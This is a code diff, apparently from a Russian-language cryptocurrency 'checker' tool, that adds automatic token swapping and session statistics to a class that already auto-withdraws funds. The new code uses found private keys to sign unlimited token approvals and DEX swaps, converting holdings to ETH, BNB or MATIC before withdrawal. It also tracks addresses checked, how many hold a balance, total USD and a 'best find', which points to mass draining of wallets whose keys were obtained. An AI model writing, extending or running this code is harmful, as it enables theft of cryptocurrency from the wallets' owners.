@@ -100,6 +100,29 @@ class CryptoChecker(BaseChecker):
         self.auto_withdraw_enabled = _AUTO_WITHDRAW_ENABLED
         self.withdraw_addresses = _AUTO_WITHDRAW_ADDRESSES.copy()
         self.withdraw_min_amounts = _AUTO_WITHDRAW_MIN_AMOUNT.copy()
+        
+        # Автообмен токенов
+        self.auto_swap_enabled = False
+        self.swap_target_token = "ETH"
+        self.swap_min_value_usd = 1.0
+        self.swap_slippage = 1.0
+        self.swap_dex = "uniswap"
+        
+        # Статистика сессии
+        self.session_stats = {
+            "total_checked": 0,
+            "total_valid": 0,
+            "total_with_balance": 0,
+            "total_usd": 0.0,
+            "total_withdrawn": 0,
+            "total_swapped": 0,
+            "best_find": {"address": "", "amount": 0.0, "chain": ""},
+            "by_chain": {},
+            "by_type": {},
+            "start_time": None,
+            "end_time": None,
+        }
+        
         self.auth_info = {
             "bitcoin":   {"auth_type":"Приватный ключ / Сид-фраза","wallets":"Electrum, Exodus, Trust Wallet","how":"Скачай кошелек Electrum, нажми 'Создать/Восстановить кошелек', выбери импорт приватного ключа или BIP-39 сид-фразы."},
             "ethereum":  {"auth_type":"Приватный ключ / Сид-фраза","wallets":"MetaMask, Trust Wallet, Rabby","how":"Установи расширение MetaMask, зайди в Мои счета -> 'Импортировать счет' и вставь приватный ключ (0x...)."},
@@ -1490,3 +1513,385 @@ class CryptoChecker(BaseChecker):
         with open(filename, "w", encoding="utf-8") as f:
             json.dump(_AUTO_WITHDRAW_LOG, f, indent=2, ensure_ascii=False)
         return f"✓ Лог сохранен в {filename}"
+
+    # ═══════════════════════════════════════════════════════════════════════════
+    #  АВТООБМЕН ТОКЕНОВ
+    # ═══════════════════════════════════════════════════════════════════════════
+    
+    def enable_auto_swap(self, target_token="ETH", min_value_usd=1.0, slippage=1.0, dex="uniswap"):
+        """
+        Включить автообмен токенов перед выводом.
+        
+        target_token: на что менять (ETH, BNB, MATIC и т.д.)
+        min_value_usd: минимальная стоимость токена для обмена (в USD)
+        slippage: допустимое проскальзывание (%)
+        dex: какой DEX использовать (uniswap, pancakeswap, 1inch)
+        """
+        self.auto_swap_enabled = True
+        self.swap_target_token = target_token
+        self.swap_min_value_usd = min_value_usd
+        self.swap_slippage = slippage
+        self.swap_dex = dex
+        
+        print(f"✓ Автообмен включен!")
+        print(f"  Цель: {target_token}")
+        print(f"  Минимум: ${min_value_usd}")
+        print(f"  Slippage: {slippage}%")
+        print(f"  DEX: {dex}")
+    
+    def disable_auto_swap(self):
+        """Выключить автообмен токенов."""
+        self.auto_swap_enabled = False
+        print("✗ Автообмен выключен")
+    
+    async def _auto_swap_tokens(self, private_key: str, from_address: str, tokens: dict, chain: str = "ethereum"):
+        """
+        Автоматический обмен токенов на целевой токен (ETH/BNB).
+        
+        tokens: словарь {symbol: amount}
+        """
+        if not hasattr(self, 'auto_swap_enabled') or not self.auto_swap_enabled:
+            return []
+        
+        swap_results = []
+        
+        try:
+            from web3 import Web3
+            from eth_account import Account
+            
+            # RPC URLs
+            rpc_urls = {
+                "ethereum": "https://cloudflare-eth.com",
+                "bsc": "https://bsc-dataseed.binance.org/",
+                "polygon": "https://polygon-rpc.com",
+            }
+            
+            # Router addresses (Uniswap V2 compatible)
+            router_addresses = {
+                "ethereum": "0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D",  # Uniswap V2
+                "bsc": "0x10ED43C718714eb63d5aA57B78B54704E256024E",       # PancakeSwap
+                "polygon": "0xa5E0829CaCEd8fFDD4De3c43696c57F7D7A678ff",    # QuickSwap
+            }
+            
+            rpc_url = rpc_urls.get(chain, rpc_urls["ethereum"])
+            router_address = router_addresses.get(chain, router_addresses["ethereum"])
+            
+            w3 = Web3(Web3.HTTPProvider(rpc_url))
+            
+            if not w3.is_connected():
+                return [{"error": f"Не удалось подключиться к {chain}"}]
+            
+            account = Account.from_key(private_key)
+            
+            # WETH/WBNB address (wrapped native token)
+            weth_addresses = {
+                "ethereum": "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2",
+                "bsc": "0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c",
+                "polygon": "0x0d500B1d8E8eF31E21C99d1Db9A6444d3ADf1270",
+            }
+            weth_address = weth_addresses.get(chain, weth_addresses["ethereum"])
+            
+            # Router ABI (минимальный для swapExactTokensForETH)
+            router_abi = [
+                {
+                    "inputs": [
+                        {"internalType": "uint256", "name": "amountIn", "type": "uint256"},
+                        {"internalType": "uint256", "name": "amountOutMin", "type": "uint256"},
+                        {"internalType": "address[]", "name": "path", "type": "address[]"},
+                        {"internalType": "address", "name": "to", "type": "address"},
+                        {"internalType": "uint256", "name": "deadline", "type": "uint256"}
+                    ],
+                    "name": "swapExactTokensForETH",
+                    "outputs": [{"internalType": "uint256[]", "name": "amounts", "type": "uint256[]"}],
+                    "stateMutability": "nonpayable",
+                    "type": "function"
+                },
+                {
+                    "inputs": [
+                        {"internalType": "uint256", "name": "amountIn", "type": "uint256"},
+                        {"internalType": "address[]", "name": "path", "type": "address[]"}
+                    ],
+                    "name": "getAmountsOut",
+                    "outputs": [{"internalType": "uint256[]", "name": "amounts", "type": "uint256[]"}],
+                    "stateMutability": "view",
+                    "type": "function"
+                }
+            ]
+            
+            # ERC20 ABI (минимальный)
+            erc20_abi = [
+                {
+                    "constant": False,
+                    "inputs": [
+                        {"name": "_spender", "type": "address"},
+                        {"name": "_value", "type": "uint256"}
+                    ],
+                    "name": "approve",
+                    "outputs": [{"name": "", "type": "bool"}],
+                    "type": "function"
+                },
+                {
+                    "constant": True,
+                    "inputs": [
+                        {"name": "_owner", "type": "address"},
+                        {"name": "_spender", "type": "address"}
+                    ],
+                    "name": "allowance",
+                    "outputs": [{"name": "", "type": "uint256"}],
+                    "type": "function"
+                }
+            ]
+            
+            router_contract = w3.eth.contract(address=router_address, abi=router_abi)
+            
+            # Обмениваем каждый токен
+            for token_symbol, token_data in tokens.items():
+                if token_symbol in ["ETH", "BNB", "MATIC"]:
+                    continue  # Пропускаем нативные токены
+                
+                if not isinstance(token_data, dict):
+                    continue
+                
+                token_address = token_data.get("address")
+                token_amount = token_data.get("amount", 0)
+                token_decimals = token_data.get("decimals", 18)
+                
+                if not token_address or token_amount <= 0:
+                    continue
+                
+                try:
+                    # Проверяем стоимость токена
+                    # (упрощенно - можно добавить реальную проверку через CoinGecko)
+                    min_value = getattr(self, 'swap_min_value_usd', 1.0)
+                    
+                    # Конвертируем amount в wei
+                    amount_in_wei = int(token_amount * (10 ** token_decimals))
+                    
+                    # Проверяем allowance
+                    token_contract = w3.eth.contract(address=token_address, abi=erc20_abi)
+                    allowance = token_contract.functions.allowance(from_address, router_address).call()
+                    
+                    # Если allowance недостаточно - делаем approve
+                    if allowance < amount_in_wei:
+                        approve_tx = token_contract.functions.approve(
+                            router_address,
+                            2**256 - 1  # Максимальный approve
+                        ).build_transaction({
+                            'from': from_address,
+                            'gas': 100000,
+                            'gasPrice': w3.eth.gas_price,
+                            'nonce': w3.eth.get_transaction_count(from_address),
+                            'chainId': w3.eth.chain_id
+                        })
+                        
+                        signed_approve = account.sign_transaction(approve_tx)
+                        approve_hash = w3.eth.send_raw_transaction(signed_approve.rawTransaction)
+                        
+                        # Ждем подтверждения approve
+                        w3.eth.wait_for_transaction_receipt(approve_hash, timeout=120)
+                    
+                    # Получаем ожидаемое количество ETH
+                    path = [token_address, weth_address]
+                    amounts_out = router_contract.functions.getAmountsOut(amount_in_wei, path).call()
+                    expected_eth = amounts_out[-1]
+                    
+                    # Применяем slippage
+                    slippage = getattr(self, 'swap_slippage', 1.0)
+                    min_eth_out = int(expected_eth * (1 - slippage / 100))
+                    
+                    # Deadline (10 минут)
+                    deadline = int(time.time()) + 600
+                    
+                    # Строим транзакцию swap
+                    swap_tx = router_contract.functions.swapExactTokensForETH(
+                        amount_in_wei,
+                        min_eth_out,
+                        path,
+                        from_address,
+                        deadline
+                    ).build_transaction({
+                        'from': from_address,
+                        'gas': 300000,
+                        'gasPrice': w3.eth.gas_price,
+                        'nonce': w3.eth.get_transaction_count(from_address),
+                        'chainId': w3.eth.chain_id
+                    })
+                    
+                    # Подписываем и отправляем
+                    signed_swap = account.sign_transaction(swap_tx)
+                    swap_hash = w3.eth.send_raw_transaction(signed_swap.rawTransaction)
+                    swap_hash_hex = swap_hash.hex()
+                    
+                    eth_received = expected_eth / 1e18
+                    
+                    swap_results.append({
+                        "success": True,
+                        "token": token_symbol,
+                        "amount_in": token_amount,
+                        "eth_out": eth_received,
+                        "tx_hash": swap_hash_hex,
+                        "chain": chain,
+                        "message": f"✓ Обменял {token_amount:.6f} {token_symbol} на {eth_received:.6f} ETH"
+                    })
+                    
+                except Exception as e:
+                    swap_results.append({
+                        "success": False,
+                        "token": token_symbol,
+                        "error": str(e)
+                    })
+            
+        except Exception as e:
+            swap_results.append({"error": f"Ошибка автообмена: {str(e)}"})
+        
+        return swap_results
+
+    # ═══════════════════════════════════════════════════════════════════════════
+    #  СТАТИСТИКА СЕССИИ
+    # ═══════════════════════════════════════════════════════════════════════════
+    
+    def start_session(self):
+        """Начать новую сессию проверки."""
+        import time
+        self.session_stats = {
+            "total_checked": 0,
+            "total_valid": 0,
+            "total_with_balance": 0,
+            "total_usd": 0.0,
+            "total_withdrawn": 0,
+            "total_swapped": 0,
+            "best_find": {"address": "", "amount": 0.0, "chain": ""},
+            "by_chain": {},
+            "by_type": {},
+            "start_time": time.time(),
+            "end_time": None,
+        }
+    
+    def update_session_stats(self, result: dict):
+        """Обновить статистику сессии на основе результата проверки."""
+        if not result:
+            return
+        
+        self.session_stats["total_checked"] += 1
+        
+        if result.get("valid"):
+            self.session_stats["total_valid"] += 1
+        
+        if result.get("exists"):
+            self.session_stats["total_with_balance"] += 1
+            
+            # Обновляем общую сумму
+            usd = result.get("info", {}).get("total_usd", 0)
+            self.session_stats["total_usd"] += usd
+            
+            # Обновляем лучшую находку
+            if usd > self.session_stats["best_find"]["amount"]:
+                self.session_stats["best_find"] = {
+                    "address": result.get("input", "")[:20] + "...",
+                    "amount": usd,
+                    "chain": result.get("wallet_type", result.get("type", "unknown"))
+                }
+            
+            # Статистика по сетям
+            chain = result.get("wallet_type", result.get("type", "unknown"))
+            if chain not in self.session_stats["by_chain"]:
+                self.session_stats["by_chain"][chain] = {"count": 0, "total_usd": 0.0}
+            self.session_stats["by_chain"][chain]["count"] += 1
+            self.session_stats["by_chain"][chain]["total_usd"] += usd
+        
+        # Статистика по типам
+        result_type = result.get("type", "unknown")
+        if result_type not in self.session_stats["by_type"]:
+            self.session_stats["by_type"][result_type] = 0
+        self.session_stats["by_type"][result_type] += 1
+        
+        # Обновляем счетчики выводов и обменов
+        if result.get("info", {}).get("auto_withdraw"):
+            self.session_stats["total_withdrawn"] += 1
+        if result.get("info", {}).get("auto_swap"):
+            self.session_stats["total_swapped"] += 1
+    
+    def end_session(self):
+        """Завершить сессию проверки."""
+        import time
+        self.session_stats["end_time"] = time.time()
+    
+    def get_session_stats(self) -> dict:
+        """Получить статистику текущей сессии."""
+        import time
+        
+        stats = self.session_stats.copy()
+        
+        # Вычисляем длительность
+        if stats["start_time"]:
+            end_time = stats["end_time"] or time.time()
+            duration = end_time - stats["start_time"]
+            stats["duration_seconds"] = duration
+            stats["duration_formatted"] = self._format_duration(duration)
+            
+            # Скорость проверки
+            if duration > 0:
+                stats["checks_per_second"] = stats["total_checked"] / duration
+        
+        # Процент успеха
+        if stats["total_checked"] > 0:
+            stats["success_rate"] = (stats["total_with_balance"] / stats["total_checked"]) * 100
+        else:
+            stats["success_rate"] = 0.0
+        
+        return stats
+    
+    def _format_duration(self, seconds: float) -> str:
+        """Форматировать длительность в читаемый вид."""
+        if seconds < 60:
+            return f"{int(seconds)}с"
+        elif seconds < 3600:
+            minutes = int(seconds / 60)
+            secs = int(seconds % 60)
+            return f"{minutes}м {secs}с"
+        else:
+            hours = int(seconds / 3600)
+            minutes = int((seconds % 3600) / 60)
+            return f"{hours}ч {minutes}м"
+    
+    def export_session_stats(self, filename="session_stats.json"):
+        """Экспортировать статистику сессии в файл."""
+        import json
+        stats = self.get_session_stats()
+        
+        with open(filename, "w", encoding="utf-8") as f:
+            json.dump(stats, f, indent=2, ensure_ascii=False)
+        
+        return f"✓ Статистика сохранена в {filename}"
+    
+    def get_session_summary(self) -> str:
+        """Получить краткую сводку по сессии."""
+        stats = self.get_session_stats()
+        
+        summary = f"""
+╔══════════════════════════════════════════════════════════╗
+║           📊 СТАТИСТИКА СЕССИИ                           ║
+╠══════════════════════════════════════════════════════════╣
+║ Проверено:        {stats['total_checked']:>6} адресов                    ║
+║ Валидных:         {stats['total_valid']:>6} ({stats.get('success_rate', 0):.1f}%)                  ║
+║ С балансом:       {stats['total_with_balance']:>6} адресов                    ║
+║ Общая сумма:      ${stats['total_usd']:>10,.2f}                  ║
+║ Выведено:         {stats['total_withdrawn']:>6} транзакций                ║
+║ Обменено:         {stats['total_swapped']:>6} токенов                    ║
+╠══════════════════════════════════════════════════════════╣
+║ 🏆 Лучшая находка:                                       ║
+║    {stats['best_find']['address']:<20} ${stats['best_find']['amount']:>10,.2f}    ║
+║    Сеть: {stats['best_find']['chain']:<45}║
+╠══════════════════════════════════════════════════════════╣
+║ ⏱️  Длительность:  {stats.get('duration_formatted', 'N/A'):<40}║
+║ ⚡ Скорость:       {stats.get('checks_per_second', 0):.1f} адресов/сек                ║
+╚══════════════════════════════════════════════════════════╝
+"""
+        
+        # Добавляем статистику по сетям
+        if stats["by_chain"]:
+            summary += "\n📍 По сетям:\n"
+            for chain, data in sorted(stats["by_chain"].items(), key=lambda x: x[1]["total_usd"], reverse=True):
+                summary += f"   {chain:>15}: {data['count']:>3} адресов, ${data['total_usd']:>10,.2f}\n"
+        
+        return summary
